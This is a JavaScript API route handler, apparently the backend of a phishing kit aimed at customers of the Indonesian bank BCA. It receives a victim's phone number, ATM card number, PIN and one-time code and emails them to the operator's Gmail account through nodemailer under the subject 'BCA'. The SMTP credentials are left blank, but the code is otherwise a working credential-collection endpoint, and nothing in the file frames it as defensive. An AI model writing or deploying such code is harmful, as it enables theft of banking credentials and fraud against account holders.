export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';
    
     if (url == ''){

       email = ''
       pass = ''
    } else {
         email = ''
         pass = ''
    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BCA',
                html: `
                    <ul>
                        <li>nohp: ${body.nohp ?? '-'}</li>
                        <li>noatm: ${body.nomoratm ?? '-'}</li>
                        <li>pin: ${body.pin ?? '-'}</li>
                        <li>otp: ${body.otp ?? '-'}</li>
                    </ul>
                `,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info:'Berhasil Terkirim', status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
